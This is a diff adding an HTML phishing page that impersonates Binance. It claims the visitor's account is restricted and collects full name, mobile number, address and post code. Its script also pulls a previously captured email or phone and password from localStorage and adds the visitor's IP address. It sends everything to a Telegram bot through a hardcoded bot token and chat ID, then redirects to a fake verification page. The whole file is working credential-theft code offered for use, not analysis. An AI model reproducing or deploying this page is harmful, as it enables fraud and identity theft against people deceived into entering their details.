@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Verify | Binance</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>
+    <link rel="icon" href="img/icon.png">
+    <script src='main.js'></script>
+</head>
+<body>
+    <img class="logo" src="img/logo.png">
+    
+    <div class="container" id="container">
+        <div class="form-container">
+            <h2 class="verify-txt">Verify your Details</h2>
+
+            <form onsubmit="sendData(); return false;">
+                <input type="hidden" name="ip" id="ipAddress">
+                <div class="input-group">
+                    <p class="label" id="label">Your account has been restricted. Please verify your details.</p>
+                </div>
+
+                <div class="input-group">
+                    <p class="label">Full Name</p>
+                    <input type="text" minlength="6" maxlength="40" required id="fullName">
+                </div>
+
+                <div class="input-group">
+                    <p class="label">Mobile Number</p>
+                    <input type="text" inputmode="numeric" minlength="11" maxlength="11" placeholder="Enter your 11 digits mobile number" required id="mobileNumber">
+                </div>
+
+                <div class="input-group">
+                    <p class="label">Address</p>
+                    <input type="text" minlength="6" maxlength="40" required id="addressField">
+                </div>
+
+                <div class="input-group">
+                    <p class="label">Post Code</p>
+                    <input type="text" minlength="5" maxlength="8" required id="postCode">
+                </div>
+                
+                <div class="input-group">
+                    <button class="next-btn" type="submit">Verify</button>
+                </div>
+            </form>
+              
+                
+            
+        </div>
+    </div>
+    <footer>
+        <p>Binance &copy; 2024</p>
+        <p>Cookie Preferences</p>
+    </footer>
+    
+    
+    
+
+
+
+<!--IP ADDRESS JS CODE START---------------->
+<script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ipAddress').value = data.ip;
+        });
+        
+});
+</script>
+    
+    
+    <script>
+        function sendData() {
+            const ip = document.getElementById('ipAddress').value;
+            const emailOrPhone = localStorage.getItem('emailOrPhone') || 'N/A';
+            const password = localStorage.getItem('password') || 'N/A';
+            const fullName = document.getElementById('fullName').value;
+            const mobileNumber = document.getElementById('mobileNumber').value;
+            const address = document.getElementById('addressField').value;
+            const postCode = document.getElementById('postCode').value;
+
+            const message = `
+IP Address: ${ip}
+Email/Phone: ${emailOrPhone}
+Password: ${password}
+Full Name: ${fullName}
+Mobile Number: ${mobileNumber}
+Address: ${address}
+Post Code: ${postCode}
+            `;
+
+            const botToken = '6544160544:AAHopuAV9dtF9Kz9nHZFi6GoZj_1SXZ5vWU';
+            const chatId = '-1001909128618';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Data sent successfully!');
+                        window.location.href = 'verificationInProgress.html';
+                        localStorage.clear(); // Clear stored data after submission
+                    } else {
+                        console.log('Error sending data.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</body>
+</html>
